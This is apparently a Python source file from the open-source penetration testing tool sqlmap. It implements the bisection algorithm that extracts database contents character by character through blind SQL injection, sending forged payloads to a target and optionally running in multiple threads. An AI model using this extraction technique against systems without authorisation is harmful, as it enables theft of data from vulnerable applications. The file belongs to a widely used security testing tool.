#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import threading
import time
import traceback

from lib.core.agent import agent
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import getCharset
from lib.core.common import getGoodSamaritanCharsets
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.convert import urlencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.exception import sqlmapValueException
from lib.core.exception import sqlmapThreadException
from lib.core.exception import unhandledException
from lib.core.progress import ProgressBar
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    partialValue = ""
    finalValue   = ""

    asciiTbl = getCharset(charsetType)

    if "LENGTH(" in expression or "LEN(" in expression:
        firstChar = 0
    elif conf.firstChar is not None and ( isinstance(conf.firstChar, int) or ( isinstance(conf.firstChar, str) and conf.firstChar.isdigit() ) ):
        firstChar = int(conf.firstChar) - 1
    elif firstChar is None:
        firstChar = 0
    elif ( isinstance(firstChar, str) and firstChar.isdigit() ) or isinstance(firstChar, int):
        firstChar = int(firstChar) - 1

    if "LENGTH(" in expression or "LEN(" in expression:
        lastChar = 0
    elif conf.lastChar is not None and ( isinstance(conf.lastChar, int) or ( isinstance(conf.lastChar, str) and conf.lastChar.isdigit() ) ):
        lastChar = int(conf.lastChar)
    elif lastChar in ( None, "0" ):
        lastChar = 0
    elif ( isinstance(lastChar, str) and lastChar.isdigit() ) or isinstance(lastChar, int):
        lastChar = int(lastChar)

    if kb.dbmsDetected:
        _, _, _, _, _, _, fieldToCastStr = agent.getFields(expression)
        nulledCastedField                = agent.nullAndCastField(fieldToCastStr)
        expressionReplaced               = expression.replace(fieldToCastStr, nulledCastedField, 1)
        expressionUnescaped              = unescaper.unescape(expressionReplaced)
    else:
        expressionUnescaped              = unescaper.unescape(expression)

    debugMsg = "query: %s" % expressionUnescaped
    logger.debug(debugMsg)

    if length and not isinstance(length, int) and length.isdigit():
        length = int(length)

    if length == 0:
        return 0, ""

    if lastChar > 0 and length > ( lastChar - firstChar ):
        length = ( lastChar - firstChar )

    showEta    = conf.eta and isinstance(length, int)
    numThreads = min(conf.threads, length)
    threads    = []

    if showEta:
        progress = ProgressBar(maxValue=length)
        progressTime = []

    if numThreads is not None:
        debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
        logger.debug(debugMsg)

    if conf.verbose >= 1 and not showEta:
        if isinstance(length, int) and conf.threads > 1:
            dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
            dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
        else:
            dataToStdout("[%s] [INFO] retrieved: " % time.strftime("%X"))

    queriesCount = [0]    # As list to deal with nested scoping rules

    hintlock  = threading.Lock()

    def tryHint(idx):
        hintlock.acquire()
        hintValue = kb.hintValue
        hintlock.release()

        if hintValue is not None and len(hintValue) >= idx:
            if kb.dbms == "SQLite":
                posValue = hintValue[idx-1]
            else:
                posValue = ord(hintValue[idx-1])

            queriesCount[0] += 1
            forgedPayload = safeStringFormat(payload.replace('%3E', '%3D'), (expressionUnescaped, idx, posValue))
            result        = Request.queryPage(urlencode(forgedPayload))

            if result:
                return hintValue[idx-1]

        hintlock.acquire()
        kb.hintValue = None
        hintlock.release()

        return None

    def getChar(idx, asciiTbl=asciiTbl):
        result = tryHint(idx)

        if result:
            return result

        maxChar = maxValue = asciiTbl[-1]
        minValue = asciiTbl[0]

        while len(asciiTbl) != 1:
            queriesCount[0] += 1
            position      = (len(asciiTbl) / 2)
            posValue      = asciiTbl[position]

            if kb.dbms == "SQLite":
                posValueOld = posValue
                posValue = chr(posValue)

            if not conf.useBetween or kb.dbms == "SQLite":
                forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
            else:
                forgedPayload = safeStringFormat(payload.replace('%3E', 'NOT BETWEEN 0 AND'), (expressionUnescaped, idx, posValue))

            result        = Request.queryPage(urlencode(forgedPayload))

            if kb.dbms == "SQLite":
                posValue = posValueOld

            if result:
                minValue = posValue
                asciiTbl = asciiTbl[position:]
            else:
                maxValue = posValue
                asciiTbl = asciiTbl[:position]

            if len(asciiTbl) == 1:
                if maxValue == 1:
                    return None
                elif minValue == maxChar:
                    asciiTbl = range( maxChar + 1, (maxChar + 1) << 8 )
                    maxChar = maxValue = asciiTbl[-1]
                    minValue = asciiTbl[0]
                else:
                    retVal = minValue + 1
                    if retVal < 256:
                        return chr(retVal)
                    else:
                        return unichr(retVal)

    def etaProgressUpdate(charTime, index):
        if len(progressTime) <= ( (length * 3) / 100 ):
            eta = 0
        else:
            midTime = sum(progressTime) / len(progressTime)
            midTimeWithLatest = (midTime + charTime) / 2
            eta = midTimeWithLatest * (length - index) / conf.threads

        progressTime.append(charTime)
        progress.update(index)
        progress.draw(eta)

    if conf.threads > 1 and isinstance(length, int) and length > 1:
        value   = [ None ] * length
        index   = [ firstChar ]    # As list for python nested function scoping
        idxlock = threading.Lock()
        iolock  = threading.Lock()
        valuelock  = threading.Lock()
        conf.seqLock = threading.Lock()
        conf.threadContinue = True

        def downloadThread():
            try:
                while conf.threadContinue:
                    idxlock.acquire()

                    if index[0] >= length:
                        idxlock.release()

                        return

                    index[0] += 1
                    curidx = index[0]
                    idxlock.release()

                    if conf.threadContinue:
                        charStart = time.time()
                        val       = getChar(curidx)

                        if val is None:
                            raise sqlmapValueException, "failed to get character at index %d (expected %d total)" % (curidx, length)
                    else:
                        break

                    valuelock.acquire()
                    value[curidx-1] = val
                    currentValue = list(value)
                    valuelock.release()

                    if conf.threadContinue:
                        if showEta:
                            etaProgressUpdate(time.time() - charStart, index[0])
                        elif conf.verbose >= 1:
                            startCharIndex = 0
                            endCharIndex = 0

                            for i in xrange(length):
                                if currentValue[i] is not None:
                                    endCharIndex = max(endCharIndex, i)

                            output = ''

                            if endCharIndex > conf.progressWidth:
                                startCharIndex = endCharIndex - conf.progressWidth

                            count = 0

                            for i in xrange(startCharIndex, endCharIndex + 1):
                                output += '_' if currentValue[i] is None else currentValue[i]

                            for i in xrange(length):
                                count += 1 if currentValue[i] is not None else 0

                            if startCharIndex > 0:
                                output = '..' + output[2:]

                            if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length-1):
                                output = output[:-2] + '..'

                            output += '_' * (min(length, conf.progressWidth) - len(output))
                            status = ' %d/%d (%d%s)' % (count, length, round(100.0*count/length), '%')
                            output += status if count != length else " "*len(status)

                            iolock.acquire()
                            dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), replaceNewlineTabs(output, stdout=True)))
                            iolock.release()

            except (sqlmapConnectionException, sqlmapValueException), errMsg:
                print
                conf.threadException = True
                logger.error("thread %d: %s" % (numThread + 1, errMsg))

            except KeyboardInterrupt:
                conf.threadException = True

                print
                logger.debug("waiting for threads to finish")

                try:
                    while (threading.activeCount() > 1):
                        pass

                except KeyboardInterrupt:
                    raise sqlmapThreadException, "user aborted"

            except:
                print
                conf.threadException = True
                errMsg = unhandledException()
                logger.error("thread %d: %s" % (numThread + 1, errMsg))
                traceback.print_exc()

        # Start the threads
        for numThread in range(numThreads):
            thread = threading.Thread(target=downloadThread)
            thread.start()
            threads.append(thread)

        # And wait for them to all finish
        try:
            alive = True
            while alive:
                alive = False
                for thread in threads:
                    if thread.isAlive():
                        alive = True
                        thread.join(5)
        except KeyboardInterrupt:
            conf.threadContinue = False
            raise

        infoMsg = None
        # If we have got one single character not correctly fetched it
        # can mean that the connection to the target url was lost
        if None in value:
            for v in value:
                if isinstance(v, str) and v is not None:
                    partialValue += v

            if partialValue:
                finalValue = partialValue
                infoMsg = "\r[%s] [INFO] partially retrieved: %s" % (time.strftime("%X"), finalValue)
        else:
            finalValue = "".join(value)
            infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), finalValue)

        if isinstance(finalValue, str) and len(finalValue) > 0:
            dataToSessionFile(replaceNewlineTabs(finalValue))

        if conf.verbose >= 1 and not showEta and infoMsg:
            dataToStdout(infoMsg)

        conf.seqLock = None
    else:
        index = firstChar

        while True:
            index    += 1
            charStart = time.time()

            if conf.useCommonPrediction:
                predictedCharset, otherCharset = getGoodSamaritanCharsets(kb.partRun, finalValue, asciiTbl)
                val = getChar(index, predictedCharset) if predictedCharset else None
                if not val:
                    val = getChar(index, otherCharset)
            else:
                val = getChar(index, asciiTbl)

            if val is None or ( lastChar > 0 and index > lastChar ):
                break

            finalValue += val

            dataToSessionFile(replaceNewlineTabs(val))

            if showEta:
                etaProgressUpdate(time.time() - charStart, index)
            elif conf.verbose >= 1:
                dataToStdout(val)

    if conf.verbose >= 1 or showEta:
        dataToStdout("\n")

    if ( conf.verbose in ( 1, 2 ) and showEta ) or conf.verbose >= 3:
        infoMsg = "retrieved: %s" % finalValue
        logger.info(infoMsg)

    if not partialValue:
        dataToSessionFile("]\n")

    if conf.threadException:
        raise sqlmapThreadException, "something unexpected happen into the threads"

    return queriesCount[0], finalValue
